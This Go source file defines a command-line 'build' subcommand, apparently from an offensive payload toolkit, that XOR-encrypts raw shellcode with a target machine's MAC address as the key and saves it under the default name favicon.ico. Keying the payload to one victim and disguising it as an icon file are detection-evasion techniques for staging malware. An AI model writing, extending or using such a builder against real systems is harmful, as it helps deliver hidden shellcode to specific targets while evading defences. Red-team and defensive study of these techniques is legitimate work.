package cmd

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"strings"

	"github.com/spf13/cobra"
)

var (
	macAddr   string
	inputFile string
	outputFile string
)

var buildCmd = &cobra.Command{
	Use:   "build",
	Short: "Encrypts a payload using a target MAC address",
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Printf("[*] Building payload for Target MAC: %s\n", macAddr)

		// 1. Clean and Parse MAC
		cleanMac := strings.ReplaceAll(macAddr, ":", "")
		cleanMac = strings.ReplaceAll(cleanMac, "-", "")
		
		keyBytes, err := hex.DecodeString(cleanMac)
		if err != nil || len(keyBytes) != 6 {
			log.Fatalf("[-] Invalid MAC address format. Use AA:BB:CC:DD:EE:FF")
		}

		// 2. Read Shellcode
		rawShellcode, err := ioutil.ReadFile(inputFile)
		if err != nil {
			log.Fatalf("[-] Could not read input file: %v", err)
		}

		// 3. XOR Encryption
		encrypted := make([]byte, len(rawShellcode))
		for i := 0; i < len(rawShellcode); i++ {
			encrypted[i] = rawShellcode[i] ^ keyBytes[i%len(keyBytes)]
		}

		// 4. Save
		err = ioutil.WriteFile(outputFile, encrypted, 0644)
		if err != nil {
			log.Fatalf("[-] Error writing output: %v", err)
		}

		fmt.Printf("[+] Success! Encrypted payload saved to: %s\n", outputFile)
	},
}

func init() {
	rootCmd.AddCommand(buildCmd)
	buildCmd.Flags().StringVarP(&macAddr, "mac", "m", "", "Target MAC Address (Required)")
	buildCmd.Flags().StringVarP(&inputFile, "input", "i", "calc.bin", "Input raw shellcode file")
	buildCmd.Flags().StringVarP(&outputFile, "out", "o", "favicon.ico", "Output filename")
	buildCmd.MarkFlagRequired("mac")
}